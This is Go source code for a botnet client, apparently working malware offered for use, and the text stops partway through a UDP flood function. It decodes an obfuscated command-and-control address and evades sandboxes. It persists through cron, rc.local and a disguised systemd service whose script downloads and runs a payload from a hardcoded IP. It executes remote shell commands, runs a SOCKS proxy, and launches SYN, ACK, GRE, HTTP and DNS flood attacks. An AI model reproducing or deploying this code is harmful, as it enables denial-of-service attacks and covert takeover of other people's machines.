package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/md5"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/miekg/dns"
)

// The ip:port of your C2
// To get the encoded text for your c2 find the obfuscate_c2.py in ./tools 
// run it python3 obf.py 1.1.1.1:443

const gothTits = "base64plusXORencodedC2URLgoesHere"  //change me 

func requestMore() string {
	decoded, err := base64.StdEncoding.DecodeString(gothTits)
	if err != nil {
		return ""
	}
	for i := range decoded {
		decoded[i] ^= 0x55
	}
	return string(decoded)
}

const (
	magicCode       = "QdT2Kp1!2@FnB#v5" //change this per campaign
	protocolVersion = "v1.0"	//change this per campaign
)

var (
	reconnectDelay      = 5 * time.Second
	numWorkers          = 2024
	socksListener       net.Listener
	socksRunning        bool
	socksMutex          sync.Mutex
	socksConnCount      int32
	maxSocksConnections int32 = 100
)

const (
	socksBufferSize = 256
)

// Helper functions
func appendToFile(path, line string, perm os.FileMode) error {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY|os.O_CREATE, perm)
	if err != nil {
		return err
	}
	defer f.Close()
	_, _ = f.WriteString(line)
	return nil
}

func RandString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func randName() string {
	dict := []string{"update", "syncd", "logger", "system", "crond", "netd"}
	return dict[rand.Intn(len(dict))] + "-" + RandString(4)
}

func createCronJob(hiddenDir string) {
	cronJob := fmt.Sprintf(`* * * * * bash %s/.redis_script.sh > /dev/null 2>&1`, hiddenDir)
	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob))
	err := cmd.Run()
	if err != nil {
		fmt.Printf("Failed to create cron job: %v\n", err)
		return
	}
	fmt.Println("Successfully created a cron job for backup persistence.")
}
func persistRcLocal() {
	rc := "/etc/rc.local"
	if _, err := os.Stat(rc); err != nil {
		return
	}
	exe, _ := os.Executable()
	b, err := os.ReadFile(rc)
	if err != nil || strings.Contains(string(b), exe) {
		return
	}
	line := exe + " # " + randName() + "\n"
	_ = appendToFile(rc, line, 0700)
}

// Function to stay on the device
func setupPersistence() {
	fmt.Println("Running hidden redisPersistence() routine for stealth persistence.")
	hiddenDir := "/var/lib/.redis_helper"
	scriptPath := filepath.Join(hiddenDir, ".redis_script.sh")
	programPath := filepath.Join(hiddenDir, ".redis_process")
	url := "http://185.247.224.107/mods/installer"
	err := os.MkdirAll(hiddenDir, 0755)
	if err != nil {
		fmt.Printf("Failed to create hidden directory: %v\n", err)
		return
	}
	fmt.Printf("Created hidden directory: %s\n", hiddenDir)
	scriptContent := fmt.Sprintf(`#!/bin/bash
	URL="%s"
	PROGRAM_PATH="%s"

	# Check if the program exists
	if [ ! -f "$PROGRAM_PATH" ]; then
		echo "Program not found. Downloading..."
		wget -O $PROGRAM_PATH $URL
		chmod +x $PROGRAM_PATH
	fi

	# Check if the program is running
	if ! pgrep -x ".redis_process" > /dev/null; then
		echo "Program is not running. Starting..."
		$PROGRAM_PATH &
	else
		echo "Program is already running."
	fi
	`, url, programPath)
	err = os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	if err != nil {
		fmt.Printf("Failed to create persistence script: %v\n", err)
		return
	}
	fmt.Printf("Successfully created hidden persistence script at %s\n", scriptPath)
	serviceContent := `[Unit]
						Description=System Helper Service
						After=network.target

						[Service]
						ExecStart=/var/lib/.redis_helper/.redis_script.sh
						Restart=always
						RestartSec=60
						StandardOutput=null
						StandardError=null

						[Install]
						WantedBy=multi-user.target
						`
	servicePath := "/etc/redis/system/redis-helper.service"
	err = os.WriteFile(servicePath, []byte(serviceContent), 0644)
	if err != nil {
		fmt.Printf("Failed to create redis service: %v\n", err)
		return
	}
	fmt.Printf("Successfully created stealthy redis service at %s\n", servicePath)
	cmd := exec.Command("systemctl", "enable", "--now", "redis-helper.service")
	err = cmd.Run()
	if err != nil {
		fmt.Printf("Failed to enable and start service: %v\n", err)
		return
	}
	fmt.Println("Successfully enabled and started the stealth persistence service.")
	createCronJob(hiddenDir)
}

// ==================== MINIMAL ANTI-SANDBOX ====================
func isSandboxed() bool {
	// Quick checks only
	vmIndicators := []string{
		// Hypervisors
		"vmware", "vbox", "virtualbox", "qemu",
		// Sandboxes
		"firejail", "bubblewrap", "gvisor", "kata",
		// Analysis tools
		"cuckoo", "joesandbox", "cape", "any.run", "hybrid-analysis",
	}
	if procs, err := os.ReadDir("/proc"); err == nil {
		for _, proc := range procs {
			if !proc.IsDir() {
				continue
			}

			// Check if it's a PID directory
			if _, err := strconv.Atoi(proc.Name()); err != nil {
				continue
			}

			// Check cmdline
			if cmdline, err := os.ReadFile("/proc/" + proc.Name() + "/cmdline"); err == nil {
				cmdStr := strings.ToLower(string(cmdline))
				for _, indicator := range vmIndicators {
					if strings.Contains(cmdStr, indicator) {
						return true
					}
				}
			}

		}
	}
	analysisTools := []string{
		"/usr/bin/strace", "/usr/bin/ltrace", "/usr/bin/gdb",
		"/usr/bin/radare2", "/usr/bin/ghidra", "/usr/bin/ida",
		"/usr/bin/wireshark", "/usr/bin/tshark", "/usr/bin/tcpdump",
	}

	for _, tool := range analysisTools {
		if _, err := os.Stat(tool); err == nil {
			// Check if these tools are running
			if out, err := exec.Command("pgrep", "-f", filepath.Base(tool)).Output(); err == nil {
				if len(strings.TrimSpace(string(out))) > 0 {
					return true
				}
			}
		}
	}

	// Check parent process for debuggers
	if ppid := os.Getppid(); ppid > 1 {
		if cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", ppid)); err == nil {
			parentCmd := strings.ToLower(string(cmdline))
			debuggers := []string{"gdb", "strace", "ltrace", "radare2", "rr"}
			for _, debugger := range debuggers {
				if strings.Contains(parentCmd, debugger) {
					return true
				}
			}
		}
	}

	return false

}

// ==================== TLS CONNECTION ====================
func parseC2Address(address string) (string, string, error) {
	address = strings.TrimSpace(address)
	address = strings.TrimPrefix(address, "tcp://")
	address = strings.TrimPrefix(address, "http://")
	address = strings.TrimPrefix(address, "https://")

	parts := strings.Split(address, ":")
	if len(parts) != 2 {
		return "", "", fmt.Errorf("invalid address")
	}
	return parts[0], parts[1], nil
}

func connectViaTLS(host, port string) (net.Conn, error) {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
	}

	dialer := &net.Dialer{Timeout: 30 * time.Second}
	rawConn, err := dialer.Dial("tcp", net.JoinHostPort(host, port))
	if err != nil {
		return nil, err
	}

	tlsConn := tls.Client(rawConn, tlsConfig)
	tlsConn.SetDeadline(time.Now().Add(30 * time.Second))

	if err := tlsConn.Handshake(); err != nil {
		tlsConn.Close()
		return nil, err
	}

	tlsConn.SetDeadline(time.Time{})
	return tlsConn, nil
}

func generateBotID() string {
	hostname, _ := os.Hostname()
	interfaces, _ := net.Interfaces()
	mac := "unknown"

	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 && len(iface.HardwareAddr) > 0 {
			mac = iface.HardwareAddr.String()
			break
		}
	}

	data := fmt.Sprintf("%s:%s", hostname, mac)
	hash := fmt.Sprintf("%x", md5.Sum([]byte(data)))
	return hash[:8]
}

func generateAuthResponse(challenge, secret string) string {
	h := md5.New()
	h.Write([]byte(challenge + secret + challenge))
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}
func detectArchitecture() string {
	// Check GOARCH first
	goarch := runtime.GOARCH
	osName := runtime.GOOS

	// Map GOARCH to common architecture names
	archMap := map[string]string{
		"386":     "x86",
		"amd64":   "x64",
		"arm":     "ARM32",
		"arm64":   "ARM64",
		"mips":    "MIPS",
		"mips64":  "MIPS64",
		"ppc64":   "PowerPC64",
		"ppc64le": "PowerPC64LE",
		"s390x":   "s390x",
		"wasm":    "WebAssembly",
	}

	if arch, exists := archMap[goarch]; exists {
		// Add OS context for clarity
		if osName == "windows" {
			if goarch == "amd64" {
				return "Windows-x64"
			} else if goarch == "386" {
				return "Windows-x86"
			}
		} else if osName == "linux" {
			return "Linux-" + arch
		} else if osName == "darwin" {
			return "macOS-" + arch
		}
		return arch
	}

	// Fallback with OS info
	return osName + "-" + goarch
}

// ==================== SHELL EXECUTION FUNCTIONS ====================
func ExecuteShell(cmd string) (string, error) {
	args := []string{"sh", "-c", cmd}
	command := exec.Command(args[0], args[1:]...)
	
	// Capture both stdout and stderr
	var stdout, stderr bytes.Buffer
	command.Stdout = &stdout
	command.Stderr = &stderr
	
	err := command.Run()
	if err != nil {
		return fmt.Sprintf("Error: %v\nStderr: %s", err, stderr.String()), err
	}
	
	output := stdout.String()
	if stderr.Len() > 0 {
		output += "\nStderr: " + stderr.String()
	}
	
	return output, nil
}

func ExecuteShellDetached(cmd string) {
	go func() {
		args := []string{"sh", "-c", cmd}
		command := exec.Command(args[0], args[1:]...)
		command.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
		command.Stdout = nil
		command.Stderr = nil
		command.Stdin = nil
		command.Start()
	}()
}

func ExecuteShellStreaming(cmd string, conn net.Conn) error {
	args := []string{"sh", "-c", cmd}
	command := exec.Command(args[0], args[1:]...)
	
	// Create pipes for stdout and stderr
	stdout, err := command.StdoutPipe()
	if err != nil {
		return err
	}
	
	stderr, err := command.StderrPipe()
	if err != nil {
		return err
	}
	
	// Start the command
	if err := command.Start(); err != nil {
		return err
	}
	
	// Create scanner for both outputs
	go func() {
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			conn.Write([]byte(fmt.Sprintf("STDOUT: %s\n", scanner.Text())))
		}
	}()
	
	go func() {
		scanner := bufio.NewScanner(stderr)
		for scanner.Scan() {
			conn.Write([]byte(fmt.Sprintf("STDERR: %s\n", scanner.Text())))
		}
	}()
	
	// Wait for command to complete
	err = command.Wait()
	if err != nil {
		conn.Write([]byte(fmt.Sprintf("EXIT ERROR: %v\n", err)))
	} else {
		conn.Write([]byte("EXIT: Command completed successfully\n"))
	}
	
	return nil
}

// ==================== SOCKS5 PROXY MODULE ====================
func startSocksProxy(port string, c2Conn net.Conn) error {
	socksMutex.Lock()
	defer socksMutex.Unlock()

	if socksRunning {
		return fmt.Errorf("SOCKS proxy already running")
	}

	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		return fmt.Errorf("failed to start SOCKS listener: %v", err)
	}

	socksListener = listener
	socksRunning = true
	atomic.StoreInt32(&socksConnCount, 0)

	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				if socksRunning {
					continue
				}
				return
			}
			// Check connection limit
			if atomic.LoadInt32(&socksConnCount) >= maxSocksConnections {
				conn.Close()
				continue
			}
			atomic.AddInt32(&socksConnCount, 1)
			go func(c net.Conn) {
				defer atomic.AddInt32(&socksConnCount, -1)
				handleSocksConnection(c, c2Conn)
			}(conn)
		}
	}()

	return nil
}

func stopSocksProxy() {
	socksMutex.Lock()
	defer socksMutex.Unlock()

	if socksListener != nil {
		socksListener.Close()
		socksListener = nil
	}
	socksRunning = false
}

func handleSocksConnection(clientConn net.Conn, c2Conn net.Conn) {
	defer clientConn.Close()

	// SOCKS5 handshake
	buf := make([]byte, socksBufferSize)

	// Read version and auth methods
	n, err := clientConn.Read(buf)
	if err != nil || n < 2 {
		return
	}

	version := buf[0]
	if version != 0x05 {
		return // Not SOCKS5
	}

	// Send auth response (no auth required)
	clientConn.Write([]byte{0x05, 0x00})

	// Read connection request
	n, err = clientConn.Read(buf)
	if err != nil || n < 7 {
		return
	}

	// Parse request
	cmd := buf[1]
	if cmd != 0x01 { // Only support CONNECT
		clientConn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}

	addrType := buf[3]
	var targetAddr string
	var targetPort uint16

	switch addrType {
	case 0x01: // IPv4
		targetAddr = net.IP(buf[4:8]).String()
		targetPort = uint16(buf[8])<<8 | uint16(buf[9])
	case 0x03: // Domain name
		domainLen := int(buf[4])
		targetAddr = string(buf[5 : 5+domainLen])
		targetPort = uint16(buf[5+domainLen])<<8 | uint16(buf[6+domainLen])
	case 0x04: // IPv6
		targetAddr = net.IP(buf[4:20]).String()
		targetPort = uint16(buf[20])<<8 | uint16(buf[21])
	default:
		clientConn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}

	// Connect to target
	target := fmt.Sprintf("%s:%d", targetAddr, targetPort)
	targetConn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		clientConn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	defer targetConn.Close()

	// Send success response
	localAddr := targetConn.LocalAddr().(*net.TCPAddr)
	response := []byte{0x05, 0x00, 0x00, 0x01}
	response = append(response, localAddr.IP.To4()...)
	response = append(response, byte(localAddr.Port>>8), byte(localAddr.Port))
	clientConn.Write(response)

	// Proxy data between client and target
	done := make(chan bool, 2)

	go func() {
		io.Copy(targetConn, clientConn)
		done <- true
	}()

	go func() {
		io.Copy(clientConn, targetConn)
		done <- true
	}()

	<-done
}

// ==================== COMMAND HANDLER ====================
func handleCommand(conn net.Conn, command string) error {
	fields := strings.Fields(command)
	if len(fields) == 0 {
		return fmt.Errorf("empty command")
	}

	cmd := fields[0]

	switch cmd {
	case "!shell", "!exec":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !shell <command>")
		}
		output, err := ExecuteShell(strings.Join(fields[1:], " "))
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("ERROR: %v\n", err)))
		} else {
			// Base64 encode to handle binary data safely
			encoded := base64.StdEncoding.EncodeToString([]byte(output))
			conn.Write([]byte(fmt.Sprintf("OUTPUT_B64: %s\n", encoded)))
		}
		return nil

	case "!stream":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !stream <command>")
		}
		go func() {
			ExecuteShellStreaming(strings.Join(fields[1:], " "), conn)
		}()
		conn.Write([]byte("Streaming started for command\n"))
		return nil

	case "!detach", "!bg":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !detach <command>")
		}
		// Detached commands don't return output
		ExecuteShellDetached(strings.Join(fields[1:], " "))
		conn.Write([]byte("Command running in background\n"))
		return nil

	case "!udpflood", "!tcpflood", "!http", "!ack", "!gre", "!syn", "!dns":
		if len(fields) != 4 {
			return fmt.Errorf("invalid format")
		}

		target := fields[1]
		targetPort, _ := strconv.Atoi(fields[2])
		duration, _ := strconv.Atoi(fields[3])

		switch cmd {
		case "!udpflood":
			go performUDPFlood(target, targetPort, duration)
		case "!tcpflood":
			go TCPfloodAttack(target, targetPort, duration)
		case "!http":
			go performHTTPFlood(target, targetPort, duration)
		case "!syn":
			go performSYNFlood(target, targetPort, duration)
		case "!ack":
			go performACKFlood(target, targetPort, duration)
		case "!gre":
			go performGREFlood(target, duration)
		case "!dns":
			go performDNSFlood(target, targetPort, duration)
		}
		conn.Write([]byte(fmt.Sprintf("Attack started: %s on %s:%d for %d seconds\n", cmd, target, targetPort, duration)))

	case "!persist":
		go setupPersistence()
		conn.Write([]byte("Persistence setup initiated\n"))

	case "!kill":
		conn.Write([]byte("Bot shutting down\n"))
		os.Exit(0)

	case "!info":
		hostname, _ := os.Hostname()
		arch := detectArchitecture()
		info := fmt.Sprintf("Hostname: %s\nArch: %s\nBotID: %s\nOS: %s\n", 
			hostname, arch, generateBotID(), runtime.GOOS)
		conn.Write([]byte(fmt.Sprintf("INFO: %s\n", info)))

	case "!socks":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !socks <port>")
		}
		port := fields[1]
		err := startSocksProxy(port, conn)
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("SOCKS ERROR: %v\n", err)))
		} else {
			conn.Write([]byte(fmt.Sprintf("SOCKS: Proxy started on port %s\n", port)))
		}

	case "!stopsocks":
		stopSocksProxy()
		conn.Write([]byte("SOCKS: Proxy stopped\n"))

	default:
		return fmt.Errorf("unknown command")
	}

	return nil
}



func handleC2Connection(conn net.Conn) {
	reader := bufio.NewReader(conn)

	// Read auth challenge
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	challengeMsg, err := reader.ReadString('\n')
	if err != nil {
		conn.Close()
		return
	}

	challengeMsg = strings.TrimSpace(challengeMsg)
	if !strings.HasPrefix(challengeMsg, "AUTH_CHALLENGE:") {
		conn.Close()
		return
	}

	challenge := strings.TrimPrefix(challengeMsg, "AUTH_CHALLENGE:")
	challenge = strings.TrimSpace(challenge)

	// Send response
	response := generateAuthResponse(challenge, magicCode)
	conn.Write([]byte(response + "\n"))

	// Read auth result
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	authResult, err := reader.ReadString('\n')
	if err != nil || strings.TrimSpace(authResult) != "AUTH_SUCCESS" {
		conn.Close()
		return
	}

	// Register bot
	botID := generateBotID()
	arch := detectArchitecture()
	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s\n", protocolVersion, botID, arch)))

	// Handle commands
	for {
		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
		command, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		command = strings.TrimSpace(command)
		if command == "PING" {
			conn.Write([]byte("PONG\n"))
			continue
		}

		// Pass the connection to handleCommand so it can send output back
		if err := handleCommand(conn, command); err != nil {
			conn.Write([]byte(fmt.Sprintf("ERROR: %v\n", err)))
		}
		// Note: OK message is now sent from within handleCommand
	}
	conn.Close()
}

// ==================== MAIN ====================
func main() {
	// Setup persistence on startup
	//setupPersistence()

	if isSandboxed() {
		os.Exit(200)
	}
	persistRcLocal()
	// Get C2 address
	c2Address := requestMore()
	if c2Address == "" {
		return
	}

	host, port, err := parseC2Address(c2Address)
	if err != nil {
		return
	}

	// Main connection loop
	for {
		conn, err := connectViaTLS(host, port)
		if err != nil {
			time.Sleep(reconnectDelay)
			continue
		}

		handleC2Connection(conn)
		time.Sleep(reconnectDelay)
	}
}

// ==================== ATTACK FUNCTIONS ====================
// DNSResponse structure
type DNSResponse struct {
	Answer []struct {
		Data string `json:"data"`
	} `json:"Answer"`
}

// CF DNS over HTTPS to resolve
func resolveTarget(target string) (string, error) {
	if net.ParseIP(target) != nil {
		return target, nil
	}
	url := fmt.Sprintf("https://1.1.1.1/dns-query?name=%s&type=A", target)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", fmt.Errorf("error creating request: %v", err)
	}
	req.Header.Set("Accept", "application/dns-json")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("error sending request: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("error resolving target: received status code %d", resp.StatusCode)
	}
	var dnsResp DNSResponse
	if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
		return "", fmt.Errorf("error decoding DNS response: %v", err)
	}
	if len(dnsResp.Answer) == 0 {
		return "", fmt.Errorf("no DNS records found for target")
	}
	return dnsResp.Answer[0].Data, nil
}

// Compact user agents list (removed ~100+ lines of duplicates)
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
}

func performHTTPFlood(target string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	fmt.Printf("Starting HTTP flood on %s:%d for %d seconds\n", target, targetPort, duration)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var requestCount int64
	const highPacketSize = 1024
	var wg sync.WaitGroup
	resolvedIP, err := resolveTarget(target)
	if err != nil {
		fmt.Printf("Failed to resolve target: %v\n", err)
		return
	}

	targetURL := fmt.Sprintf("http://%s:%d", resolvedIP, targetPort)

	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 10; Pixel 4 XL Build/QP1A.190821.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
	}
	referers := []string{
		"https://www.google.com/",
		"https://www.example.com/",
		"https://www.wikipedia.org/",
		"https://www.reddit.com/",
		"https://www.github.com/",
	}
	acceptLanguages := []string{
		"en-US,en;q=0.9",
		"fr-FR,fr;q=0.9",
		"es-ES,es;q=0.9",
		"de-DE,de;q=0.9",
	}

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{}
			for {
				select {
				case <-ctx.Done():
					return
				default:
					body := make([]byte, highPacketSize)
					req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
					if err != nil {
						fmt.Printf("Error creating request: %v\n", err)
						continue
					}
					req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
					req.Header.Set("Referer", referers[rand.Intn(len(referers))])
					req.Header.Set("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
					req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
					resp, err := client.Do(req)
					if err != nil {
						fmt.Printf("Error sending HTTP request: %v\n", err)
						continue
					}
					resp.Body.Close()
					atomic.AddInt64(&requestCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("HTTP flood complete. Requests sent: %d\n", atomic.LoadInt64(&requestCount))
}

// SynFlood
func performSYNFlood(targetIP string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())

	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		fmt.Printf("Invalid target IP address\n")
		return
	}

	var packetCount int64
	var wg sync.WaitGroup

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
						DstPort:    layers.TCPPort(targetPort),
						Seq:        rand.Uint32(),
						Window:     12800,
						SYN:        true,
						DataOffset: 5,
					}
					maxPacketSize := 65535
					ipAndTcpHeadersSize := 20 + 20
					payloadSize := maxPacketSize - ipAndTcpHeadersSize
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error crafting TCP packet: %v\n", err)
						continue
					}
					packetData := buffer.Bytes()
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}

	wg.Wait()

	fmt.Printf("SYN flood attack completed. Packets sent: %d\n", packetCount)
}

// AckFlood
func performACKFlood(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}

	var packetCount int64
	var wg sync.WaitGroup

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(64312) + 1024),
						DstPort:    layers.TCPPort(targetPort),
						ACK:        true,
						Seq:        rand.Uint32(),
						Ack:        rand.Uint32(),
						Window:     12800,
						DataOffset: 5,
					}
					maxPacketSize := 65535
					ipAndTcpHeadersSize := 20 + 20
					payloadSize := maxPacketSize - ipAndTcpHeadersSize
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error crafting TCP ACK packet: %v\n", err)
						continue
					}
					packetData := buffer.Bytes()

					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("ACK flood attack completed. Sent %d packets.\n", atomic.LoadInt64(&packetCount))
	return nil
}

// GreFlood
func performGREFlood(targetIP string, duration int) error {
	rand.Seed(time.Now().UnixNano())
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}
	var packetCount int64
	var wg sync.WaitGroup

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:gre", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					greLayer := &layers.GRE{}
					maxPacketSize := 65535
					ipAndGreHeadersSize := 20 + 4
					payloadSize := maxPacketSize - ipAndGreHeadersSize
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, greLayer, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error crafting GRE packet: %v\n", err)
						continue
					}
					packetData := buffer.Bytes()
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("GRE flood attack completed. Sent %d packets.\n", atomic.LoadInt64(&packetCount))
	return nil
}

// DnsFlood
func performDNSFlood(targetIP string, targetPort, duration int) {
	fmt.Printf("Starting Enhanced DNS flood on %s:%d for %d seconds\n", targetIP, targetPort, duration)
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		fmt.Printf("Invalid target IP address: %s\n", targetIP)
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var packetCount int64
	var wg sync.WaitGroup

	domains := []string{"youtube.com", "google.com", "spotify.com", "neflix.com", "bing.com", "facebok.com", "amazom.com"}
	queryTypes := []uint16{dns.TypeA, dns.TypeAAAA, dns.TypeMX, dns.TypeNS}
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				fmt.Printf("Error listening for UDP: %v\n", err)
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					domain := domains[rand.Intn(len(domains))]
					queryType := queryTypes[rand.Intn(len(queryTypes))]
					dnsQuery := constructDNSQuery(domain, queryType)
					buffer, err := dnsQuery.Pack()
					if err != nil {
						fmt.Printf("Error packing DNS query: %v\n", err)
						continue
					}
					sourcePort := rand.Intn(65535-1024) + 1024
					_, err = conn.WriteTo(buffer, &net.UDPAddr{IP: dstIP, Port: targetPort, Zone: fmt.Sprintf("%d", sourcePort)})
					if err != nil {
						fmt.Printf("Error sending DNS packet: %v\n", err)
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("Enhanced DNS flood completed. Packets sent: %d\n", atomic.LoadInt64(&packetCount))
}

// Make the a DNS query message
func constructDNSQuery(domain string, queryType uint16) *dns.Msg {
	msg := new(dns.Msg)
	msg.SetQuestion(dns.Fqdn(domain), queryType)

	// Add EDNS0 to support larger responses
	edns0 := new(dns.OPT)
	edns0.Hdr.Name = "."
	edns0.Hdr.Rrtype = dns.TypeOPT
	edns0.SetUDPSize(4096) // Use 4096 for max payload size
	msg.Extra = append(msg.Extra, edns0)

	return msg
}
func performUDPFlood(targetIP string, targetPort, duration int) {
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

